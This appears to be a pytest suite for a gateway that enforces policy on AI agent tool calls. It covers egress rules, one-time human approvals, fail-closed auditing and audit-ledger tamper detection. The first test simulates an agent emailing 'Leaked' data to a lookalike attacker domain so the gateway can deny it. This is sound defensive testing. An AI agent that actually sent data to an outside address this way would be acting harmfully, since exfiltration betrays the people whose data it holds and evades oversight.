import pytest
import uuid
from fastapi.testclient import TestClient
from fastapi import HTTPException
from fastapi.security import HTTPAuthorizationCredentials

from app.main import app, require_admin, get_current_user
from app.models import ToolRequest, PolicyDecision, DecisionStatus, ApprovalAction
from app.pep.gateway import PEPGateway
from app.pep.policy import AGENT_REGISTRY
from app.pep.approval_manager import ApprovalManager, ApprovalAlreadyConsumedError
from app.crypto.signer import ToolSigner
from app.crypto.merkle_log import HashChainAuditLedger


@pytest.mark.asyncio
async def test_email_lookalike_domain_is_denied():
    """Lookalike domain attacker@evilcompany.com is denied even though it ends with company.com."""
    gw = PEPGateway()
    
    # 1. Evil lookalike domain
    req_evil = ToolRequest(
        call_id=f"call_{uuid.uuid4().hex[:8]}",
        agent_id="agent_worker_01",
        tool_name="send_email",
        arguments={"to": "attacker@evilcompany.com", "subject": "Data", "body": "Leaked"},
        source="user_prompt"
    )
    dec_evil = await gw.intercept(req_evil)
    assert dec_evil.status == DecisionStatus.DENY
    assert dec_evil.rule_id == "R-EGRESS-01"
    assert "evilcompany.com" in dec_evil.reason

    # 2. Legitimate exact domain
    req_legit = ToolRequest(
        call_id=f"call_{uuid.uuid4().hex[:8]}",
        agent_id="agent_worker_01",
        tool_name="send_email",
        arguments={"to": "teammate@company.test", "subject": "Report", "body": "Summary"},
        source="user_prompt"
    )
    dec_legit = await gw.intercept(req_legit)
    assert dec_legit.status == DecisionStatus.ALLOW

    # 3. Legitimate subdomain
    req_sub = ToolRequest(
        call_id=f"call_{uuid.uuid4().hex[:8]}",
        agent_id="agent_worker_01",
        tool_name="send_email",
        arguments={"to": "audit@sec.company.com", "subject": "Alert", "body": "Clean"},
        source="user_prompt"
    )
    dec_sub = await gw.intercept(req_sub)
    assert dec_sub.status == DecisionStatus.ALLOW


@pytest.mark.asyncio
async def test_one_time_approval_consumption_and_replay_rejection():
    """Approval is consumed once; replaying the same call_id raises an error or returns 409."""
    broadcaster_events = []
    async def dummy_broadcast(event):
        broadcaster_events.append(event)

    mgr = ApprovalManager(broadcaster=dummy_broadcast)
    cid = f"call_{uuid.uuid4().hex[:8]}"
    
    # Simulate pending item
    req = ToolRequest(call_id=cid, agent_id="agent_worker_01", tool_name="execute_bash", arguments={"command": "ls"})
    dec = PolicyDecision(call_id=cid, status=DecisionStatus.DENY, tier=3, risk_score=80.0, reasons=["high tier"])
    
    # Wait for human in background
    import asyncio
    wait_task = asyncio.create_task(mgr.wait_for_human(req, dec))
    await asyncio.sleep(0.01)

    # First resolution: Success
    action = ApprovalAction(call_id=cid, action="APPROVE", decision="APPROVE", reviewer="admin_alice")
    ok = mgr.resolve(cid, action)
    assert ok is True
    res = await wait_task
    assert res.status == DecisionStatus.ALLOW

    # Second resolution (Replay Attack): Must be rejected!
    with pytest.raises(ApprovalAlreadyConsumedError):
        mgr.resolve(cid, action)


@pytest.mark.asyncio
async def test_audit_failure_fails_closed():
    """If audit logging fails, PEP fails closed and denies execution (R-AUDIT-FAIL)."""
    async def failing_audit_hook(request, decision):
        raise IOError("Disk full: Audit store unavailable")

    gw = PEPGateway(audit_hook=failing_audit_hook)
    req = ToolRequest(
        call_id=f"call_{uuid.uuid4().hex[:8]}",
        agent_id="agent_worker_01",
        tool_name="read_document",
        arguments={"filename": "q3_report.txt"},
        source="user_prompt"
    )
    decision = await gw.intercept(req)
    assert decision.status == DecisionStatus.DENY
    assert decision.rule_id == "R-AUDIT-FAIL"
    assert "Execution denied (fail-closed)" in decision.reason


def test_ephemeral_signing_key_generated():
    """Dynamic 256-bit ephemeral secret is generated when environment variable is unset."""
    signer = ToolSigner()
    assert len(signer.secret_key) >= 32
    # Verify signing works cleanly with this key
    sig = signer.sign_tool("test_tool", {"type": "object"}, "TIER_1")
    valid, msg = signer.verify_tool("test_tool", {"type": "object"}, "TIER_1", sig)
    assert valid is True


def test_api_auth_boundaries():
    """API endpoints enforce token validation and role checks."""
    client = TestClient(app)

    # 1. Invalid bearer token -> 401 Unauthorized
    resp_invalid = client.post(
        "/api/reset",
        headers={"Authorization": "Bearer invalid-tampered-token-12345"}
    )
    assert resp_invalid.status_code == 401
    assert "Invalid" in resp_invalid.json()["detail"]

    # 2. Worker token attempting admin action -> 403 Forbidden
    resp_forbidden = client.post(
        "/api/reset",
        headers={"Authorization": "Bearer worker-token-01"}
    )
    assert resp_forbidden.status_code == 403
    assert "Admin role required" in resp_forbidden.json()["detail"]

    # 3. Valid admin token -> 200 OK
    resp_ok = client.post(
        "/api/reset",
        headers={"Authorization": "Bearer admin-secret-session-90214"}
    )
    assert resp_ok.status_code == 200
    assert resp_ok.json()["status"] == "RESET_SUCCESSFUL"


def test_audit_hash_includes_role_and_risk_score():
    """Audit block calculation binds agent_role and risk_score directly into SHA-256 hash."""
    ledger = HashChainAuditLedger()
    req = ToolRequest(
        call_id="call_audit_test",
        agent_id="agent_worker_01",
        agent_role="worker",
        tool_name="read_document",
        arguments={"filename": "test.txt"},
        source="user_prompt"
    )
    dec = PolicyDecision(
        call_id="call_audit_test",
        status=DecisionStatus.ALLOW,
        rule_id="R-ALLOW-01",
        risk_score=15.0,
        reasons=["Safe read"]
    )
    block = ledger.record_event(req, dec)
    assert ledger.verify_integrity().is_valid is True

    # Mutate agent_role directly in memory -> verify fails
    block.agent_role = "admin"
    res = ledger.verify_integrity()
    assert res.is_valid is False
    assert "Data forgery detected" in res.message
